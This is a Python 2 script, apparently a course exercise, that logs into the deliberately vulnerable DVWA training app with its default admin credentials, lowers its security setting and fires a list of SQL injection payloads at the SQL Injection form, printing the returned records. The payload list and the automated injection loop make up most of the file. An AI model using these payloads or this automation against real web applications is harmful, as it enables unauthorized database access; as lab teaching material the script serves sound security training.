#!/usr/bin/env python

"""  
	Module 4: Attacking Web Applications
	Excercise - SQL Injection in the DVWA
"""

import sys
import mechanize
from bs4 import BeautifulSoup


sqlInjectionList = [ "1", "' OR ' 1=1", "admin' --", "admin' #", "admin'/*",
"' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", "') OR '1'='1--", "') OR ('1'='1--" ]

#Define Global Variables and Objects
browser = mechanize.Browser()
#override the check for robots.txt
browser.set_handle_robots(False)

#Follows refresh 0 but not hangs on refresh > 0
#alternatively you may want to switch off the refreshing with browser.set_handle_refresh(False)
browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

#set the browser headers
browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Ubuntu/9.10 Firefox/3.6.0')]


def dvwa_login(url, form_number, user, passwd):
	browser.open(url)
	#forms_show()
	
	#select the first form
	browser.select_form(nr=0)
	
	#set the credentials and submit the data to the authentication form	
	browser.form['username'] = user
	browser.form['password'] = passwd
	browser.submit()

def lower_sec(url):
	response = browser.open(url)
	
	#forms_show()	
	
	#select the first form
	browser.select_form(nr=0)
	
	#set the security = low	
	browser.form['security'] = ['low']
	browser.submit()


def dvwa_sqli(url):
	
	for sqli in sqlInjectionList:
	
		browser.open(url)
		
		#select the first form
		browser.select_form(nr=0)

		print "[+] Testing SQL Injection :%s" %sqli
		browser.form['id'] = sqli		
		
		response=browser.submit()
		
		htmlresult = response.read()
		
		bs = BeautifulSoup(htmlresult, 'lxml')
		IDs = bs.find_all('pre')
		
		for idSql in IDs:
			print idSql
	
def forms_show():
	for form in browser.forms():
		print form

def links_enum(base_url, links_text):
	#page links enumeration function
	for link in browser.links():
		if links_text == link.text:
			return base_url + link.url.rstrip('.')
		

def main():
	if len(sys.argv) !=2:
		print "Syntax: ./dvwa_sqli.py target_IP"
		sys.exit(1)

	ip_address = sys.argv[1]

	#split and check the last digit of an IP Address
	ip_address_classC= int(ip_address.split('.')[3])

	if ip_address_classC < 1 or ip_address_classC > 255:
		print "The IP Address %s provided is not correct" % ip_address
		print "Exiting...."
		sys.exit(1)

	#define the urls
	base_url = 'http://' + ip_address + '/dvwa/'
	dvwa_login_url = base_url +'login.php'

	#login to the DVWA page
	dvwa_login(dvwa_login_url, 0, "admin", "password")

	print (links_enum(base_url,'DVWA Security'))

	#lower the security settings
	lower_sec(links_enum(base_url,'DVWA Security'))

	print (links_enum(base_url,'SQL Injection'))
	
	#perform SQLI Attacks
	dvwa_sqli(links_enum(base_url,'SQL Injection'))
	
	#Perform SQLI Blind Attacks
	#dvwa_sqli(links_enum('SQL Injection \(Blind\)'))
	

if __name__ =="__main__":
	main()
